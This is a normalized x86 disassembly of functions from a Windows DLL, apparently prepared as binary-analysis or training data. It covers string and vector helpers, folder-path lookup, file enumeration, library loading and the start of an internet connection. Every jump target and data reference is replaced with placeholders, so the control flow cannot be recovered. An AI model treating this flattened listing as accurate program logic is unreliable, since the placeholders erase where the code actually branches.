push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10017569
push 0x0
push 0x1
lea ecx [ esp + 0x14 ]
call sub_10002020
mov eax esi
mov ecx [ esp + 0x30 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov ecx [ esp + 0x20 ]
xor ecx esp
call sub_100242d7
mov esp ebp
pop ebp
retn 0x1c
sub_10017569
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
lea eax [ ebp - 0x10 ]
push eax
mov ebx ecx
call sub_10010e6d
push [ ebp + 0xc ]
mov esi [ eax ]
push [ ebp + 0x8 ]
mov edi [ eax + 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_10017924
push edi
push esi
push [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
push [ ebp + 0x8 ]
call sub_10017924
add esp 0x20
push 0xffffffff
push 0x0
push [ ebp + 0x18 ]
mov ecx ebx
push [ ebp - 0x8 ]
push eax
call sub_1001763d
pop edi
pop esi
pop ebx
leave
retn 0x14
sub_100175bf
push ebp
mov ebp esp
push esi
mov esi ecx
push 0x0
mov [ esi + 0x18 ] 0xf
call sub_10002004
push [ ebp + 0xc ]
mov ecx esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100175ea
mov eax esi
pop esi
pop ebp
retn 0x8
sub_100175ea
push 0x8
mov eax sub_1004cd5d
call sub_10028236
mov [ ebp - 0x14 ] ecx
mov eax [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
sub eax esi
push eax
call sub_100084a7
and [ ebp - 0x4 ] 0x0
call sub_100282db
retn 0xc
movzx eax [ esi ]
mov ecx [ ebp - 0x14 ]
push eax
push 0x1
call sub_10007a24
inc esi
jmp r-xdata
cmp esi [ ebp + 0xc ]
je r-xdata
sub_1001763d
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
cmp [ edi + 0x14 ] esi
jb r-xdata
call sub_10022f7c
mov eax [ ebp + 0x10 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebp + 0x14 ]
jae r-xdata
mov ecx [ edi + 0x14 ]
mov eax ecx
sub eax esi
cmp eax [ ebp + 0xc ]
jae r-xdata
mov eax [ ebp + 0x10 ]
mov eax [ eax + 0x14 ]
sub eax [ ebp + 0x14 ]
cmp eax [ ebp + 0x18 ]
jae r-xdata
mov [ ebp + 0xc ] eax
sub ecx [ ebp + 0xc ]
or eax 0xffffffff
sub eax [ ebp + 0x18 ]
cmp eax ecx
ja r-xdata
mov [ ebp + 0x18 ] eax
mov eax [ edi + 0x14 ]
mov ecx eax
sub ecx [ ebp + 0xc ]
mov ebx eax
add ecx [ ebp + 0x18 ]
sub ebx esi
sub ebx [ ebp + 0xc ]
mov [ ebp - 0x4 ] ecx
mov [ ebp + 0x8 ] ebx
cmp eax ecx
jae r-xdata
call sub_10022f44
cmp edi [ ebp + 0x10 ]
je r-xdata
push 0x0
push ecx
mov ecx edi
call sub_10001ed2
mov eax [ ebp + 0xc ]
lea ebx [ edi + 0x4 ]
cmp [ ebp + 0x18 ] eax
ja r-xdata
mov eax [ edi + 0x18 ]
cmp eax 0x10
jb r-xdata
cmp [ ebp + 0x14 ] esi
ja r-xdata
mov eax [ edi + 0x18 ]
cmp eax 0x10
jb r-xdata
lea edx [ edi + 0x4 ]
mov edx [ edi + 0x4 ]
jmp r-xdata
add eax esi
cmp eax [ ebp + 0x14 ]
mov eax [ edi + 0x18 ]
ja r-xdata
mov eax [ edi + 0x18 ]
cmp eax 0x10
jb r-xdata
mov ecx ebx
mov ecx [ ebx ]
jmp r-xdata
lea ecx [ edi + 0x4 ]
mov ecx [ edi + 0x4 ]
jmp r-xdata
cmp eax 0x10
jb r-xdata
cmp eax 0x10
jb r-xdata
cmp eax 0x10
jb r-xdata
mov ecx ebx
mov ecx [ ebx ]
jmp r-xdata
mov [ ebp + 0x10 ] ebx
mov edx [ ebx ]
mov [ ebp + 0x10 ] edx
jmp r-xdata
cmp eax 0x10
jb r-xdata
lea edx [ eax + 0x4 ]
mov edx [ eax + 0x4 ]
jmp r-xdata
add edx esi
add edx [ ebp + 0xc ]
push ebx
sub eax esi
sub eax [ ebp + 0x18 ]
push edx
add ecx esi
add ecx [ ebp + 0x18 ]
push eax
push ecx
call sub_10001cbd
mov eax [ ebp + 0x10 ]
add esp 0x10
cmp [ eax + 0x18 ] 0x10
jb r-xdata
mov ecx ebx
mov ecx [ ebx ]
jmp r-xdata
mov ecx ebx
mov ecx [ ebx ]
jmp r-xdata
mov [ ebp + 0x10 ] ebx
mov edx [ ebx ]
mov [ ebp + 0x10 ] edx
jmp r-xdata
cmp eax 0x10
jb r-xdata
mov ecx ebx
mov ecx [ ebx ]
jmp r-xdata
push [ ebp + 0x18 ]
mov edx [ ebp + 0x14 ]
add ecx edx
sub eax esi
push ecx
push eax
mov eax [ ebp + 0x10 ]
add eax esi
push eax
call sub_10001cbd
mov eax [ edi + 0x18 ]
add esp 0x10
cmp eax 0x10
jb r-xdata
lea ecx [ edi + 0x4 ]
mov ecx [ edi + 0x4 ]
jmp r-xdata
mov eax [ edi + 0x18 ]
cmp eax 0x10
jb r-xdata
mov [ ebp + 0x10 ] ebx
mov edx [ ebx ]
mov [ ebp + 0x10 ] edx
jmp r-xdata
cmp eax 0x10
jb r-xdata
mov [ ebp + 0x10 ] ebx
mov edx [ ebx ]
mov [ ebp + 0x10 ] edx
jmp r-xdata
cmp eax 0x10
jb r-xdata
mov ecx ebx
mov ecx [ ebx ]
jmp r-xdata
push [ ebp + 0x8 ]
sub eax esi
sub eax [ ebp + 0x18 ]
add ecx esi
add ecx [ ebp + 0xc ]
push ecx
push eax
mov eax [ ebp + 0x10 ]
add eax esi
add eax [ ebp + 0x18 ]
push eax
call sub_10001cbd
mov eax [ edi + 0x18 ]
add esp 0x10
cmp eax 0x10
jb r-xdata
push [ ebp + 0x8 ]
add ecx esi
add ecx [ ebp + 0xc ]
sub eax esi
sub eax [ ebp + 0x18 ]
add ebx esi
add ebx [ ebp + 0x18 ]
jmp r-xdata
mov ebx [ ebx ]
cmp eax 0x10
jb r-xdata
add esp 0x10
push [ ebp - 0x4 ]
mov ecx edi
call sub_10002004
mov eax edi
pop edi
pop esi
pop ebx
leave
retn 0x14
push [ ebp + 0x18 ]
mov ebx [ ebp + 0x14 ]
add edx ebx
push edx
sub eax esi
push eax
add ecx esi
push ecx
call sub_10001fe8
jmp r-xdata
mov ecx ebx
mov ecx [ ebx ]
jmp r-xdata
push [ ebp + 0xc ]
mov edx [ ebp + 0x14 ]
add ecx edx
sub eax esi
push ecx
push eax
mov eax [ ebp + 0x10 ]
add eax esi
push eax
call sub_10001cbd
mov eax [ edi + 0x18 ]
add esp 0x10
cmp eax 0x10
jb r-xdata
mov ecx ebx
mov ecx [ ebx ]
jmp r-xdata
push [ ebp + 0x8 ]
sub eax esi
sub eax [ ebp + 0x18 ]
add ecx esi
add ecx [ ebp + 0xc ]
push ecx
push eax
mov eax [ ebp + 0x10 ]
add eax esi
add eax [ ebp + 0x18 ]
push eax
call sub_10001cbd
mov eax [ edi + 0x18 ]
add esp 0x10
cmp eax 0x10
jb r-xdata
mov edx [ ebp + 0x14 ]
add ecx edx
mov ebx [ ebx ]
cmp eax 0x10
jb r-xdata
push ecx
push eax
push ebx
call sub_10001cbd
mov [ ebp + 0x10 ] ebx
mov edx [ ebx ]
mov [ ebp + 0x10 ] edx
jmp r-xdata
cmp eax 0x10
jb r-xdata
sub ecx [ ebp + 0xc ]
add ecx [ ebp + 0x14 ]
add ecx [ ebp + 0x18 ]
jmp r-xdata
mov ebx [ ebx ]
cmp eax 0x10
jb r-xdata
mov ecx ebx
mov ecx [ ebx ]
jmp r-xdata
push [ ebp + 0x8 ]
sub eax esi
sub eax [ ebp + 0x18 ]
add ecx esi
add ecx [ ebp + 0xc ]
push ecx
push eax
mov eax [ ebp + 0x10 ]
add eax esi
add eax [ ebp + 0x18 ]
push eax
call sub_10001cbd
mov eax [ edi + 0x18 ]
add esp 0x10
cmp eax 0x10
jb r-xdata
push [ ebp + 0x18 ]
sub eax esi
add ebx esi
jmp r-xdata
mov edx [ ebp + 0x18 ]
sub edx [ ebp + 0xc ]
sub eax esi
sub eax [ ebp + 0xc ]
push edx
mov edx [ ebp + 0x14 ]
add ecx edx
add ecx [ ebp + 0x18 ]
add ebx esi
add ebx [ ebp + 0xc ]
mov ebx [ ebx ]
cmp eax 0x10
jb r-xdata
sub_1001793b
cmp [ ecx + 0x18 ] 0x10
jb r-xdata
lea eax [ ecx + 0x4 ]
mov eax [ ecx + 0x4 ]
jmp r-xdata
push ecx
mov ecx [ ecx + 0x14 ]
add ecx eax
push ecx
mov ecx [ esp + 0xc ]
call sub_100089e1
mov eax [ esp + 0x4 ]
retn 0x4
sub_1001797d
push 0x20
mov eax sub_1004d236
call sub_10028203
push [ ebp + 0xc ]
and [ ebp - 0x10 ] 0x0
lea ecx [ ebp - 0x2c ]
call sub_10001fc2
push [ ebp + 0x10 ]
and [ ebp - 0x4 ] 0x0
mov ecx eax
call sub_10017960
mov ecx [ ebp + 0x8 ]
push eax
call sub_10001fc2
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10002020
mov eax [ ebp + 0x8 ]
call sub_100282db
retn
sub_100179c4
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004d200
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2a0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x298 ] eax
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x2a8 ]
mov [ fs : 0x0 ] eax
xor esi esi
push 0x208
lea eax [ esp + 0x98 ]
push esi
push eax
mov [ esp + 0x14 ] esi
call sub_10024b80
add esp 0xc
lea eax [ esp + 0x94 ]
push eax
push esi
push esi
push [ ebp + 0x8 ]
push esi
call [ SHGetFolderPathW@IAT ]
cmp eax 0x1
jne r-xdata
cmp eax 0x80004005
jne r-xdata
push r--data
lea ecx [ esp + 0x10 ]
call sub_10001c7f
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0x2c ]
mov [ esp + 0x2b4 ] esi
call sub_10002075
push r--data
lea eax [ esp + 0x2c ]
cmp eax 0x80070057
jne r-xdata
push r--data
lea ecx [ esp + 0x10 ]
call sub_10001c7f
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0x2c ]
mov [ esp + 0x2b4 ] 0x1
call sub_10002075
push r--data
lea eax [ esp + 0x2c ]
jmp r-xdata
cmp eax esi
je r-xdata
push r--data
lea ecx [ esp + 0x10 ]
call sub_10001c7f
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0x2c ]
mov [ esp + 0x2b4 ] 0x2
call sub_10002075
push r--data
lea eax [ esp + 0x2c ]
jmp r-xdata
push eax
call sub_10027dd1
lea eax [ esp + 0x94 ]
push eax
mov ecx ebx
call sub_1000134a
mov eax ebx
mov ecx [ esp + 0x2a8 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov ecx [ esp + 0x298 ]
xor ecx esp
call sub_100242d7
mov esp ebp
pop ebp
retn
push r--data
lea ecx [ esp + 0x54 ]
call sub_10001c7f
lea eax [ esp + 0x50 ]
push eax
lea ecx [ esp + 0x70 ]
mov [ esp + 0x2b4 ] 0x3
call sub_10002075
push r--data
lea eax [ esp + 0x70 ]
jmp r-xdata
sub_10017b71
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ecx ]
push [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
mov eax [ ecx + 0x4 ]
lea ecx [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_10017b9e
mov ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0x8
sub_10017b9e
push esi
mov esi ecx
mov eax [ esi ]
push edi
mov edi [ esp + 0xc ]
cmp eax 0xfffffffc
je r-xdata
lea eax [ edi + edi ]
add [ esi + 0x4 ] eax
pop edi
mov eax esi
pop esi
retn 0x4
test eax eax
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x8
jb r-xdata
call sub_10024832
lea ecx [ eax + 0x4 ]
mov ecx [ eax + 0x4 ]
jmp r-xdata
call sub_10024832
cmp [ eax + 0x18 ] 0x8
jb r-xdata
mov edx [ esi + 0x4 ]
push ebx
mov ebx [ eax + 0x14 ]
lea ecx [ ecx + ebx * 2 ]
lea edx [ edx + edi * 2 ]
pop ebx
cmp edx ecx
ja r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
cmp edx eax
jae r-xdata
sub_10017bfc
push 0x5c
mov eax sub_1004e5f3
call sub_1002826c
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x30 ] esi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
lea edi [ esi + 0x258 ]
push eax
mov ecx edi
mov [ esi ] r--data
mov [ esi + 0x4 ] ebx
call sub_1000136c
lea eax [ ebp + 0xc ]
lea ecx [ esi + 0x274 ]
push eax
mov [ ebp - 0x4 ] 0x1
call sub_1000136c
mov eax [ ebp + 0x28 ]
mov [ ebp - 0x4 ] 0x2
mov [ esi + 0x290 ] eax
mov al [ ebp + 0x2c ]
push 0x250
mov [ esi + 0x294 ] al
lea eax [ esi + 0x8 ]
push ebx
push eax
mov [ esi + 0x295 ] bl
call sub_10024b80
add esp 0xc
push r--data
lea eax [ ebp - 0x68 ]
push edi
push eax
call sub_10004ab3
add esp 0xc
lea ecx [ esi + 0x274 ]
push ecx
push eax
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x4 ] 0x3
call sub_10010cbe
add esp 0xc
xor edi edi
push ebx
inc edi
push edi
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x4 ] 0x5
call sub_10001500
cmp [ ebp - 0x14 ] 0x8
mov edx [ ebp - 0x28 ]
jae r-xdata
xor ecx ecx
cmp [ esi + 0x290 ] edi
jne r-xdata
lea edx [ ebp - 0x28 ]
xor eax eax
cmp [ esi + 0x294 ] bl
je r-xdata
mov ecx edi
push eax
push ebx
push ecx
lea eax [ esi + 0x8 ]
push eax
push ebx
push edx
call [ FindFirstFileExW@IAT ]
mov [ esi + 0x4 ] eax
cmp eax ebx
je r-xdata
mov eax edi
call [ GetLastError@IAT ]
cmp eax 0x2
je r-xdata
cmp eax 0xffffffff
jne r-xdata
push ebx
push edi
lea ecx [ ebp - 0x2c ]
call sub_10001500
push ebx
push edi
lea ecx [ ebp + 0xc ]
call sub_10001500
mov eax esi
call sub_100282ef
retn 0x28
push r--data
lea ecx [ ebp - 0x4c ]
call sub_10001c7f
mov [ ebp - 0x4 ] 0x6
mov eax [ esi + 0x4 ]
cmp eax ebx
je r-xdata
xor eax eax
inc eax
cmp eax 0xffffffff
je r-xdata
xor al al
jmp r-xdata
lea ecx [ ebp - 0x4c ]
push ecx
push eax
call sub_10014ddd
pop ecx
pop ecx
push ebx
push edi
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x5
call sub_10002020
mov eax esi
call sub_10017eaa
mov [ esi + 0x295 ] al
sub_10017d75
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov [ esi ] r--data
test eax eax
je r-xdata
push 0x0
push 0x1
lea ecx [ esi + 0x274 ]
call sub_10001500
push 0x0
push 0x1
lea ecx [ esi + 0x258 ]
call sub_10001500
pop esi
retn
push eax
call [ FindClose@IAT ]
and [ esi + 0x4 ] 0x0
sub_10017db0
push 0x1c
mov eax sub_1004dff5
call sub_10028203
push 0x250
lea edi [ esi + 0x8 ]
push 0x0
push edi
call sub_10024b80
add esp 0xc
push edi
push [ esi + 0x4 ]
call [ FindNextFileW@IAT ]
mov edi eax
cmp edi 0x1
je r-xdata
push r--data
lea ecx [ ebp - 0x28 ]
call sub_10001c7f
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
cmp edi 0x1
setne al
movzx eax al
push eax
call sub_10014ddd
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_10002020
mov [ esi + 0x295 ] 0x1
mov al 0x1
call [ GetLastError@IAT ]
cmp eax 0x12
jne r-xdata
mov [ esi + 0x295 ] 0x0
xor al al
jmp r-xdata
call sub_100282db
retn
sub_10017e37
push 0x8
mov eax sub_1004ea3b
call sub_10028203
mov edi [ ebp + 0x8 ]
mov esi ecx
xor ebx ebx
push ebx
mov [ ebp - 0x4 ] ebx
push 0x1
mov [ ebp - 0x10 ] ebx
call sub_100018cf
pop ecx
pop ecx
cmp eax ebx
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov eax edi
call sub_100282db
retn 0x4
lea ebx [ esi + 0x8 ]
mov [ edi ] eax
mov [ edi + 0xc ] ebx
mov [ edi + 0x10 ] ebx
mov [ edi + 0x14 ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x10 ] 0x1
cmp [ esi + 0x295 ] bl
je r-xdata
mov eax esi
call sub_10017eaa
cmp al 0x1
je r-xdata
push ebx
mov eax edi
call sub_10017edf
call sub_10017db0
test al al
je r-xdata
sub_10017eaa
push esi
mov esi eax
cmp eax 0x2
jne r-xdata
test cl cl
je r-xdata
mov al 0x1
pop esi
retn
cmp cl 0x1
jne r-xdata
call sub_10017db0
test al al
jne r-xdata
mov eax [ esi + 0x8 ]
and al 0x10
cmp al 0x10
mov eax [ esi + 0x290 ]
sete cl
cmp eax 0x1
jne r-xdata
pop esi
retn
sub_10017edf
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
mov edi eax
mov ecx [ edi + 0xc ]
mov esi 0x250
test ecx ecx
jne r-xdata
mov eax [ edi + 0x14 ]
sub eax ecx
cdq
mov ebx esi
idiv ebx
mov [ ebp - 0x8 ] eax
and [ ebp - 0x8 ] ecx
jmp r-xdata
lea esi [ ebp - 0xc ]
call sub_10018308
push [ ebp - 0x8 ]
lea eax [ ebp - 0xc ]
push [ ebp - 0xc ]
push [ ebp + 0x8 ]
push eax
mov eax edi
call sub_10017f4a
push [ ebp + 0x8 ]
push 0x1
push ebx
call sub_10018000
mov [ edi + 0x10 ] eax
jmp r-xdata
mov ebx [ edi + 0x10 ]
mov eax ebx
sub eax ecx
cdq
idiv esi
cmp eax [ ebp - 0x8 ]
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_10017f4a
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0xc ]
mov eax [ edi + 0x10 ]
sub eax ebx
cdq
mov ecx 0x250
idiv ecx
test eax eax
jne r-xdata
lea esi [ ebp - 0x8 ]
call sub_10018308
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
and [ ebp - 0x4 ] eax
jmp r-xdata
call sub_10024832
cmp eax [ ebp - 0x8 ]
je r-xdata
push [ ebp + 0x14 ]
mov ecx edi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_10018033
mov ebx [ edi + 0xc ]
lea esi [ ebp - 0x10 ]
call sub_10018308
mov edi [ ebp - 0x10 ]
mov esi [ ebp - 0xc ]
mov ebx edi
mov [ ebp - 0xc ] esi
test edi edi
jne r-xdata
mov ecx [ edi ]
jmp r-xdata
call sub_10024832
xor ecx ecx
mov eax [ ebp + 0x14 ]
sub eax [ ebp - 0x4 ]
mov ecx 0x250
cdq
idiv ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
imul eax eax 0x250
add esi eax
cmp esi [ ecx + 0x10 ]
ja r-xdata
call sub_10024832
test edi edi
je r-xdata
xor edi edi
mov edi [ edi ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
pop edi
mov [ eax + 0x4 ] esi
pop esi
mov [ eax ] ebx
pop ebx
leave
retn 0x10
cmp esi [ edi + 0xc ]
jae r-xdata
sub_10018000
push ebp
mov ebp esp
push ecx
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
push [ ebp + 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001839a
mov eax [ ebp + 0xc ]
imul eax eax 0x250
add esp 0x14
add eax [ ebp + 0x8 ]
pop edi
leave
retn 0xc
sub_10018033
push 0x268
mov eax sub_1004d1ac
call sub_100282a2
mov eax [ ebp + 0x8 ]
mov ebx ecx
mov ecx [ ebx + 0xc ]
mov [ ebp - 0x274 ] eax
mov edi 0x250
test ecx ecx
jne r-xdata
mov eax [ ebx + 0x14 ]
sub eax ecx
cdq
mov esi edi
idiv esi
mov [ ebp - 0x26c ] eax
and [ ebp - 0x26c ] ecx
jmp r-xdata
lea edx [ eax + 0x1 ]
mov eax [ ebp - 0x26c ]
cmp eax edx
jae r-xdata
call sub_1001827a
mov esi [ ebx + 0x10 ]
mov eax esi
sub eax ecx
cdq
mov ecx edi
idiv ecx
mov ecx 0x6eb3e4
mov edx ecx
mov [ ebp - 0x270 ] esi
sub edx eax
cmp edx 0x1
jae r-xdata
mov eax esi
sub eax [ ebp + 0x10 ]
mov esi [ ebp - 0x274 ]
cdq
idiv edi
mov ecx 0x94
lea edi [ ebp - 0x268 ]
[ edi ] [ esi ]
cmp eax 0x1
jae r-xdata
shr eax 0x1
sub ecx eax
cmp ecx [ ebp - 0x26c ]
jae r-xdata
mov esi [ ebp - 0x270 ]
push esi
lea edi [ esi - 0x250 ]
push esi
mov ecx edi
call sub_10018328
push esi
push [ ebp + 0x10 ]
mov ecx edi
mov [ ebx + 0x10 ] eax
call sub_1001834c
mov eax [ ebp + 0x10 ]
pop ecx
pop ecx
lea edx [ eax + 0x250 ]
jmp r-xdata
mov ecx [ ebp + 0x10 ]
lea eax [ ecx + 0x250 ]
push eax
push [ ebp - 0x270 ]
call sub_10018328
mov [ ebp - 0x4 ] 0x2
mov ecx [ ebx + 0x10 ]
lea eax [ ebp - 0x268 ]
push eax
mov eax ecx
sub eax [ ebp + 0x10 ]
mov esi 0x250
cdq
mov edi esi
idiv edi
xor edx edx
inc edx
sub edx eax
push edx
push ecx
call sub_10018000
add [ ebx + 0x10 ] esi
mov ebx [ ebx + 0x10 ]
mov edx [ ebp + 0x10 ]
lea eax [ ebx - 0x250 ]
jmp r-xdata
add [ ebp - 0x26c ] eax
and [ ebp - 0x26c ] 0x0
jmp r-xdata
cmp eax edx
jne r-xdata
cmp edx eax
jne r-xdata
mov ecx [ ebp - 0x26c ]
call sub_100182b9
mov [ ebp - 0x270 ] eax
mov eax [ ebp + 0x10 ]
sub eax [ ebx + 0xc ]
mov ecx edi
cdq
idiv ecx
push [ ebp - 0x274 ]
and [ ebp - 0x4 ] 0x0
push 0x1
mov esi eax
imul eax eax 0x250
add eax [ ebp - 0x270 ]
push eax
call sub_10018000
push [ ebp - 0x270 ]
mov ecx [ ebx + 0xc ]
push [ ebp + 0x10 ]
call sub_10018328
mov ecx [ ebp + 0x10 ]
inc esi
imul esi esi 0x250
add esi [ ebp - 0x270 ]
push esi
push [ ebx + 0x10 ]
call sub_10018328
mov ecx [ ebx + 0xc ]
mov eax [ ebx + 0x10 ]
sub eax ecx
cdq
mov esi edi
idiv esi
mov esi eax
inc esi
test ecx ecx
je r-xdata
mov [ ebp - 0x26c ] edx
cmp [ ebp - 0x26c ] edx
jae r-xdata
mov edi eax
mov ecx 0x94
lea esi [ ebp - 0x268 ]
[ edi ] [ esi ]
add eax 0x250
call sub_100282fe
retn 0xc
mov edi edx
mov ecx 0x94
lea esi [ ebp - 0x268 ]
[ edi ] [ esi ]
add edx 0x250
jmp r-xdata
mov eax [ ebp - 0x26c ]
imul esi esi 0x250
mov ecx [ ebp - 0x270 ]
imul eax eax 0x250
add eax ecx
add esi ecx
mov [ ebx + 0x14 ] eax
mov [ ebx + 0x10 ] esi
mov [ ebx + 0xc ] ecx
jmp r-xdata
mov eax [ ebx + 0x10 ]
jmp r-xdata
cmp ecx eax
jne r-xdata
add ecx edi
push [ ebx + 0xc ]
call sub_100242e6
pop ecx
sub_1001827a
push 0x44
mov eax sub_1004d191
call sub_10028203
push r--data
lea ecx [ ebp - 0x28 ]
call sub_10001c7f
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp - 0x50 ]
call sub_10001a6d
push r--data
lea eax [ ebp - 0x50 ]
push eax
mov [ ebp - 0x50 ] r--data
call sub_10027dd1
int3
sub_100182b9
push ebp
mov ebp esp
sub esp 0x10
test ecx ecx
ja r-xdata
or eax 0xffffffff
xor edx edx
div ecx
cmp eax 0x250
jae r-xdata
xor ecx ecx
imul ecx ecx 0x250
push ecx
call sub_10024389
pop ecx
leave
retn
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
call sub_100243ff
push r--data
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] r--data
call sub_10027dd1
int3
sub_10018308
and [ esi ] 0x0
test edi edi
je r-xdata
call sub_10024832
cmp [ edi + 0xc ] ebx
ja r-xdata
cmp ebx [ edi + 0x10 ]
jbe r-xdata
mov eax [ edi ]
mov [ esi ] eax
mov [ esi + 0x4 ] ebx
mov eax esi
retn
sub_10018328
push ebp
mov ebp esp
push ecx
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_100183cb
add esp 0xc
pop edi
leave
retn 0x8
sub_1001834c
push ebp
mov ebp esp
mov eax ecx
sub eax [ ebp + 0x8 ]
push esi
cdq
mov esi 0x250
idiv esi
mov edx eax
mov eax [ ebp + 0xc ]
imul edx edx 0x250
sub eax edx
mov edx ecx
cmp [ ebp + 0x8 ] ecx
je r-xdata
pop esi
pop ebp
retn
mov esi [ ebp + 0xc ]
sub esi ecx
push edi
mov [ ebp + 0xc ] esi
jmp r-xdata
sub edx 0x250
lea edi [ esi + edx ]
mov ecx 0x94
mov esi edx
[ edi ] [ esi ]
cmp edx [ ebp + 0x8 ]
jne r-xdata
mov esi [ ebp + 0xc ]
pop edi
sub_1001839a
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0xc ] eax
jbe r-xdata
pop ebp
retn
push esi
push edi
dec [ ebp + 0xc ]
add [ ebp + 0x8 ] 0x250
cmp [ ebp + 0xc ] eax
ja r-xdata
mov esi [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov ecx 0x94
[ edi ] [ esi ]
cmp [ ebp + 0x8 ] eax
je r-xdata
pop edi
pop esi
sub_100183cb
push ebx
mov ebx ecx
cmp ebx [ esp + 0x8 ]
je r-xdata
pop ebx
retn
push esi
mov edx 0x250
push edi
add ebx edx
add eax edx
cmp ebx [ esp + 0x10 ]
jne r-xdata
mov ecx 0x94
mov esi ebx
mov edi eax
[ edi ] [ esi ]
test eax eax
je r-xdata
pop edi
pop esi
sub_100183f8
push 0x20
mov eax sub_1004e168
call sub_10028203
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x18 ] 0x8
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
push eax
call [ LoadLibraryW@IAT ]
push r--data
lea ecx [ ebp - 0x28 ]
mov edi eax
call sub_10001c7f
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
test edi edi
sete al
movzx eax al
push eax
call sub_10014ddd
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_10002020
mov [ esi + 0x4 ] edi
mov [ esi ] r--data
mov eax esi
call sub_100282db
retn 0x4
sub_1001847e
push 0x24
mov eax sub_1004de5b
call sub_10028203
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ esi ] r--data
call sub_100282db
retn
push eax
call [ FreeLibrary@IAT ]
push r--data
lea ecx [ ebp - 0x2c ]
mov ebx eax
call sub_10001c7f
lea eax [ ebp - 0x2c ]
push eax
test ebx ebx
sete al
movzx eax al
push eax
mov [ ebp - 0x4 ] 0x1
call sub_10014ddd
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10002020
and [ esi + 0x4 ] 0x0
sub_1001850c
push 0x20
mov eax sub_1004e168
call sub_10028203
mov edi ecx
mov esi edx
call sub_100188bf
mov esi [ ebp + 0x8 ]
mov ebx eax
call sub_100188bf
cmp [ edi + 0x18 ] 0x8
jb r-xdata
add edi 0x4
mov edi [ edi + 0x4 ]
jmp r-xdata
xor esi esi
push esi
push eax
push ebx
push esi
push edi
call [ InternetOpenW@IAT ]
push r--data
lea ecx [ ebp - 0x28 ]
mov edi eax
call sub_10001c7f
lea eax [ ebp - 0x28 ]
push eax
cmp edi esi
sete al
movzx eax al
push eax
mov [ ebp - 0x4 ] esi
call sub_10014ddd
pop ecx
pop ecx
push esi
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_10002020
mov eax edi
call sub_100282db
retn
sub_100185b7
push 0x1c
mov eax sub_1004dff5
call sub_10028203
mov edi ecx
mov esi edx
call sub_100188bf
mov esi [ ebp + 0xc ]
mov ebx eax
call sub_100188bf
cmp [ edi + 0x18 ] 0x8
jb r-xdata
add edi 0x4
mov edi [ edi + 0x4 ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x4 ]
xor esi esi
push esi
push esi
push 0x3
push eax
push ebx
push 0x50
